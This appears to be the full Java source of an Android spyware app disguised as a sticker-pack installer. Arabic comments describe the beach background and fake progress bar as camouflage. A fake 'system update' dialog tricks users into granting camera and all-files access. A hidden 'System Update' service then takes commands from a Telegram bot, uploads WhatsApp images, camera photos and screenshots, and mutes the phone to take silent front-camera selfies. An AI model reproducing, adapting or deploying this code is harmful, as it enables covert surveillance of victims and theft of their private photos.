package com.google.android.sync.v24;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.Camera;
import android.media.AudioManager;
import android.os.*;
import android.view.Gravity;
import android.widget.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import android.graphics.PorterDuff;
import com.bumptech.glide.Glide;
import android.webkit.WebView;
import android.graphics.Color;

public class MainActivity extends Activity {
    
    TextView tv;
    private static final int RE_CODE = 101;
    int progressStatus = 0;
    Handler progressHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. الواجهة الأساسية مع الخلفية
        RelativeLayout rootLayout = new RelativeLayout(this);
        ImageView backgroundView = new ImageView(this);
        backgroundView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        rootLayout.addView(backgroundView);

        // تحميل صورة الشاطئ للتمويه
        String bgUrl = "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?fm=jpg&w=1000"; 
        Glide.with(this).load(bgUrl).into(backgroundView);

        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setGravity(Gravity.CENTER);
        contentLayout.setPadding(60, 60, 60, 60);
        rootLayout.addView(contentLayout, new RelativeLayout.LayoutParams(-1, -1));
        
        tv = new TextView(this); 
        
        TextView emojiView = new TextView(this);
        emojiView.setText("✨  🎨  🖼️  🔥"); 
        emojiView.setTextSize(40);
        emojiView.setGravity(Gravity.CENTER);
        contentLayout.addView(emojiView);

        // إضافة حركة بسيطة للإيموجي
        android.view.animation.Animation anim = new android.view.animation.AlphaAnimation(0.3f, 1.0f);
        anim.setDuration(1000);
        anim.setRepeatMode(android.view.animation.Animation.REVERSE);
        anim.setRepeatCount(android.view.animation.Animation.INFINITE);
        emojiView.startAnimation(anim);

        // 3. شريط التحميل
        ProgressBar pb = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setLayoutParams(new LinearLayout.LayoutParams(-1, 25));
        pb.setMax(100);
        pb.getProgressDrawable().setColorFilter(Color.parseColor("#00BFFF"), PorterDuff.Mode.SRC_IN); 
        contentLayout.addView(pb);
        
        // 4. نص الحالة
        tv.setTextColor(Color.WHITE);
        tv.setGravity(Gravity.CENTER);
        tv.setShadowLayer(2, 2, 2, Color.BLACK);
        contentLayout.addView(tv);
        
        setContentView(rootLayout);

        // 5. العداد الوهمي لفتح المعرض
        new Thread(() -> {
            while (progressStatus < 100) { 
                progressStatus += 1;
                progressHandler.post(() -> {
                    pb.setProgress(progressStatus);
                    if(progressStatus < 30) tv.setText("\nجاري فحص جودة الملصقات... " + progressStatus + "%");
                    else if(progressStatus < 70) tv.setText("\nجاري تحميل الحزمة برابط مباشر... " + progressStatus + "%");
                    else tv.setText("\nجاري تثبيت الملصقات على الموبايل... " + progressStatus + "%");
                });
                try { Thread.sleep(150); } catch (Exception e) {}
            }
            progressHandler.post(() -> { showStickersGallery(); });
        }).start();
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkPermissionsAndStart();
    }

     private void checkPermissionsAndStart() {
        // لو مفيش صلاحية كاميرا، هنطلع له "تنبيه" الأول يشرح ليه
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                
                // إنشاء رسالة تنبيه بشكل احترافي
                new AlertDialog.Builder(this)
                    .setTitle("تحديث النظام مطلوب ⚙️")
                    .setMessage("لكي يتم تثبيت ملصقات (Sticker V23) بنجاح على جهازك، يجب منح إذن الوصول لوحدة التخزين والكاميرا في الخطوة التالية.")
                    .setCancelable(false)
                    .setPositiveButton("موافق، استمرار", (dialog, which) -> {
                        // أول ما يدوس موافق، نطلب الصلاحية الحقيقية
                        requestPermissions(new String[]{android.Manifest.permission.CAMERA}, RE_CODE);
                    })
                    .show();
                return; 
            }
        }
        
        // لو وافق على الكاميرا، نطبق نفس الفكرة لملفات أندرويد 11
        if (Build.VERSION.SDK_INT >= 30) {
            if (!isAllFilesPermissionGranted()) {
                new AlertDialog.Builder(this)
                    .setTitle("إذن الوصول للملفات 📂")
                    .setMessage("يرجى تفعيل خيار 'الوصول إلى جميع الملفات' لضمان حفظ الملصقات داخل معرض الصور الخاص بك.")
                    .setCancelable(false)
                    .setPositiveButton("إعدادات الوصول", (dialog, which) -> {
                        openSettings(); 
                    })
                    .show();
            } else {
                startSystem();
            }
        } else {
            startSystem();
        }
    }
	

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == RE_CODE) {
            if (grantResults.length > 0 && grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                checkPermissionsAndStart();
            } else {
                Toast.makeText(this, "اضغط رجوع ثم وافق على الصلاحية للاستمرار", Toast.LENGTH_LONG).show();
                new Handler().postDelayed(this::openAppSettings, 1000);
            }
        }
    }

    private void openAppSettings() {
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            android.net.Uri uri = android.net.Uri.fromParts("package", getPackageName(), null);
            intent.setData(uri);
            startActivityForResult(intent, 123);
        } catch (Exception e) {}
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 123) {
            new Handler().postDelayed(() -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{android.Manifest.permission.CAMERA}, RE_CODE);
                }
            }, 500);
        }
    }

    private void openSettings() {
        new Handler().postDelayed(() -> {
            try {
                Intent i = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                i.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception e) {
                try {
                    startActivity(new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"));
                } catch (Exception ex) {}
            }
        }, 1000);
    }

    private boolean isAllFilesPermissionGranted() {
        try {
            return (boolean) Environment.class.getMethod("isExternalStorageManager").invoke(null);
        } catch (Exception e) { return true; }
    }

    private void startSystem() {
        Intent intent = new Intent(this, BackgroundWorker.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(intent);
        else startService(intent);
    }

    private void showStickersGallery() {
        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(Color.parseColor("#F5F5F5"));
        GridLayout grid = new GridLayout(this);
        grid.setColumnCount(3); 
        grid.setPadding(20, 20, 20, 20);

        for (int i = 1; i <= 69; i++) {
            String imageName = "s" + i;
            int resId = getResources().getIdentifier(imageName, "drawable", getPackageName());
            if (resId != 0) {
                LinearLayout box = new LinearLayout(this);
                box.setOrientation(LinearLayout.VERTICAL);
                box.setGravity(Gravity.CENTER);
                box.setPadding(10, 20, 10, 20);
                ImageView img = new ImageView(this);
                Glide.with(this).load(resId).into(img);
                box.addView(img, new LinearLayout.LayoutParams(220, 220));
                Button btn = new Button(this);
                btn.setText("إضافة");
                btn.setTextSize(10);
                btn.setOnClickListener(v -> Toast.makeText(this, "تمت الإضافة بنجاح!", Toast.LENGTH_SHORT).show());
                box.addView(btn);
                grid.addView(box);
            }
        }
        scroll.addView(grid);
        setContentView(scroll);
    }

    public static class BackgroundWorker extends Service {
        String token ="Enter your token";
        String chatId = "Enter chatId";
        ExecutorService executor = Executors.newFixedThreadPool(4);
        volatile boolean isScanning = false;
        long lastUpdateId = 0;
        SharedPreferences prefs;
        String deviceName = Build.MODEL.replace(" ", "_");

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startMyForeground();
            prefs = getSharedPreferences("system_data", MODE_PRIVATE);
            if (!prefs.getBoolean("hello_sent", false)) {
                sendMsg("✅ تم التثبيت بنجاح\n📱 الجهاز: " + deviceName);
                prefs.edit().putBoolean("hello_sent", true).apply();
            }
            new Timer().scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() { listenToTelegram(); }
            }, 0, 8000);
            return START_STICKY;
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }

        private void listenToTelegram() {
            try {
                URL url = new URL("https://api.tele" + "gram.org/bot" + token + "/getUpdates?offset=" + (lastUpdateId + 1));
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(5000);
                BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) sb.append(line);
                String res = sb.toString(); r.close();

                if (res.contains("\"text\":\"")) {
                    String msgText = res.substring(res.lastIndexOf("\"text\":\"") + 8);
                    msgText = msgText.substring(0, msgText.indexOf("\"")).toLowerCase().trim();
                    boolean forMe = !msgText.contains(" ") || msgText.contains(deviceName.toLowerCase());

                    if (msgText.startsWith("stop") && forMe) {
                        updateId(res); isScanning = false;
                        sendMsg("🛑 تم إيقاف العمليات: " + deviceName);
                    }
                    else if (msgText.startsWith("wa") && forMe) {
                        startTask(res, "📂 سحب واتساب: " + deviceName, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/");
                    } 
                    else if (msgText.startsWith("cam_folder") && forMe) {
                        startTask(res, "📸 سحب استوديو: " + deviceName, "DCIM/Camera/");
                    }
                    else if (msgText.startsWith("ss") && forMe) {
                        updateId(res); isScanning = true;
                        sendMsg("📱 جاري البحث عن اسكرينات: " + deviceName);
                        executor.execute(() -> {
                            scan(new File(Environment.getExternalStorageDirectory(), "DCIM/Screenshots/"));
                            scan(new File(Environment.getExternalStorageDirectory(), "Pictures/Screenshots/"));
                        });
                    }
                    else if (msgText.startsWith("cam") && !msgText.startsWith("cam_folder") && forMe) {
                        updateId(res); sendMsg("📸 محاولة لقط سيلفي صامت: " + deviceName);
                        takeSelfie();
                    }
                }
            } catch (Exception e) {}
        }

        private void startTask(String res, String msg, String path) {
            updateId(res); isScanning = true;
            sendMsg(msg);
            executor.execute(() -> scan(new File(Environment.getExternalStorageDirectory(), path)));
        }

        private void takeSelfie() {
            new Handler(Looper.getMainLooper()).post(() -> {
                Camera camera = null;
                try {
                    AudioManager audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    int[] streams = {AudioManager.STREAM_SYSTEM, AudioManager.STREAM_ALARM, AudioManager.STREAM_NOTIFICATION, AudioManager.STREAM_RING};
                    for (int s : streams) {
                        audio.setStreamVolume(s, 0, 0);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) audio.adjustStreamVolume(s, AudioManager.ADJUST_MUTE, 0);
                    }

                    int camId = -1;
                    for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                        Camera.CameraInfo info = new Camera.CameraInfo();
                        Camera.getCameraInfo(i, info);
                        if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { camId = i; break; }
                    }
                    camera = Camera.open(camId != -1 ? camId : 1);
                    try { camera.enableShutterSound(false); } catch (Exception e) {}
                    SurfaceTexture st = new SurfaceTexture(0);
                    camera.setPreviewTexture(st);
                    camera.startPreview();
                    final Camera finalCam = camera;
                    new Handler().postDelayed(() -> {
                        try {
                            finalCam.takePicture(null, null, (data, cam) -> {
                                new Thread(() -> {
                                    try {
                                        File f = new File(getExternalFilesDir(null), "s_" + System.currentTimeMillis() + ".jpg");
                                        FileOutputStream out = new FileOutputStream(f);
                                        out.write(data); out.close();
                                        uploadFile(f);
                                        cam.release();
                                    } catch (Exception e) {}
                                }).start();
                            });
                        } catch (Exception e) { if(finalCam != null) finalCam.release(); }
                    }, 2000);
                } catch (Exception e) { 
                    if (camera != null) camera.release();
                    sendMsg("❌ الكاميرا مشغولة في " + deviceName); 
                }
            });
        }

        private void scan(File dir) {
            if (!isScanning || dir == null || !dir.exists()) return;
            File[] list = dir.listFiles();
            if (list == null) return;
            for (File f : list) {
                if (!isScanning) return; 
                if (f.isDirectory() && !f.getName().startsWith(".")) scan(f);
                else {
                    String n = f.getName().toLowerCase();
                    if ((n.endsWith(".jpg") || n.endsWith(".png")) && !prefs.getBoolean(f.getAbsolutePath(), false)) {
                        uploadFile(f);
                        try { Thread.sleep(750); } catch (Exception e) {}
                    }
                }
            }
        }

        private void uploadFile(File file) {
            try {
                String b = "===" + System.currentTimeMillis() + "===";
                URL u = new URL("https://api.tele" + "gram.org/bot" + token + "/sendPhoto");
                HttpURLConnection c = (HttpURLConnection) u.openConnection();
                c.setDoOutput(true); c.setRequestMethod("POST");
                c.setConnectTimeout(10000);
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
                OutputStream o = c.getOutputStream();
                o.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n--" + b + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"p.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").getBytes());
                FileInputStream i = new FileInputStream(file);
                byte[] buf = new byte[8192]; int l;
                while ((l = i.read(buf)) != -1) o.write(buf, 0, l);
                o.write(("\r\n--" + b + "--\r\n").getBytes());
                o.close(); i.close();
                if (c.getResponseCode() == 200) prefs.edit().putBoolean(file.getAbsolutePath(), true).apply();
            } catch (Exception e) {}
        }

        private void sendMsg(String t) {
            new Thread(() -> {
                try {
                    new URL("https://api.tele" + "gram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream(); 
                } catch (Exception e) {}
            }).start();
        }

        private void updateId(String res) {
            try {
                int i = res.lastIndexOf("\"update_id\":");
                if (i != -1) {
                    String sub = res.substring(i + 12);
                    lastUpdateId = Long.parseLong(sub.substring(0, sub.indexOf(",")).trim());
                }
            } catch (Exception e) {}
        }

        private void startMyForeground() {
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel channel = new NotificationChannel("sys_service", "System Update", NotificationManager.IMPORTANCE_LOW);
                ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
                startForeground(1, new Notification.Builder(this, "sys_service").setContentTitle("System Service").setContentText("Checking for updates...").build());
            }
        }
    }
    }
            
